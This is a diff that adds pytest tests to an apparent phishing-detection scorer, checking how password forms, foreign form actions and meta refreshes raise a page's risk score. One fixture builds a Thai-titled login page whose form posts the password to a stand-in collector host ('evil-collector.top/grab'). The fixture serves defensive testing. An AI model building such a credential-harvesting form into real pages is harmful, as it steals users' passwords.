@@ -73,6 +73,50 @@ async def test_thai_official_in_title_lowers_score():
 
 
 @pytest.mark.asyncio
+async def test_login_form_posting_to_foreign_host_raises_score():
+    # Password form whose action exfiltrates to a different host.
+    html = (
+        "<html><title>เข้าสู่ระบบ</title>"
+        "<form action='https://evil-collector.top/grab'>"
+        "<input type='password' name='pw'/></form></html>"
+    )
+    with patch("app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)):
+        adj = await content_score_adjustment(
+            "https://bank-login.xyz/signin", frozenset()
+        )
+    # password (0.10) + foreign form action (0.15)
+    assert adj >= 0.25
+
+
+@pytest.mark.asyncio
+async def test_same_host_form_action_no_extra_penalty():
+    html = (
+        "<html><title>เข้าสู่ระบบ</title>"
+        "<form action='https://bank-login.xyz/submit'>"
+        "<input type='password' name='pw'/></form></html>"
+    )
+    with patch("app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)):
+        adj = await content_score_adjustment(
+            "https://bank-login.xyz/signin", frozenset()
+        )
+    # only the password signal — same-host action is not penalised
+    assert adj == pytest.approx(0.10)
+
+
+@pytest.mark.asyncio
+async def test_meta_refresh_to_foreign_host_raises_score():
+    html = (
+        "<html><head><meta http-equiv='refresh' "
+        "content='0;url=https://elsewhere.top/landing'></head></html>"
+    )
+    with patch("app.content_check.httpx.AsyncClient", return_value=_make_mock_client(html)):
+        adj = await content_score_adjustment(
+            "https://cloaked.xyz/", frozenset()
+        )
+    assert adj >= 0.10
+
+
+@pytest.mark.asyncio
 async def test_fetch_error_returns_zero():
     mock_client = AsyncMock()
     mock_client.__aenter__ = AsyncMock(side_effect=Exception("timeout"))
